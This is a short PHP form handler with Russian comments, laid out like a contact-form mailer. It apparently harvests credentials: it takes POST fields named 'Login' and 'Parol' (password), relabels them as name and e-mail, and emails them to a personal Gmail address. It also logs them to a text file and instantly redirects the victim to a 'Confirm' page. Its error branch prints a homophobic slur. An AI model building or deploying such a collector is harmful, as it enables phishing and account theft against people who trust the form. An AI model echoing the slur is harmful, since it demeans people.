<? 
// ----------------------------конфигурация-------------------------- // 
 
$adminemail="Kirilltht@gmail.com";  // e-mail админа 
 
 
$date=date("d.m.y"); // число.месяц.год 
 
$time=date("H:i"); // часы:минуты:секунды 
 
$backurl="https://kirilltht.github.io/Confirm.html";  // На какую страничку переходит после отправки письма 
 
//---------------------------------------------------------------------- // 
 
  
 
// Принимаем данные с формы 
 
$name=$_POST['Login']; 
 
$email=$_POST['Parol']; 
 
$msg=$_POST["message"]; 
 
  
 
// Проверяем валидность e-mail 
 
if (!preg_match("|([a-z0-9\.\-]{1,20})|is", 
strtolower($name))) 
 
 { 
 
  echo 'ты пидор';
 
  } 
 
 else 
 
 { 
 
 
$msg=" 
 
 
<p>Имя: $name</p> 
 
 
<p>E-mail: $email</p> 
 
 
<p>Сообщение: $msg</p> 
 
 
"; 
 
  
 
 // Отправляем письмо админу  
 
mail("$adminemail", "$date $time Сообщение 
от $name", "$msg"); 
 
  
 
// Сохраняем в базу данных 
 
$f = fopen("message.txt", "a+"); 
 
fwrite($f," \n $date $time Сообщение от $name"); 
 
fwrite($f,"\n $msg "); 
 
fwrite($f,"\n ---------------"); 
 
fclose($f); 
 
  
 
// Выводим сообщение пользователю 
 
print "<script language='Javascript'><!-- 
function reload() {location = \"$backurl\"}; setTimeout('reload()', 0); 
//--></script> 
 ";  
exit; 
 
 } 
 
?>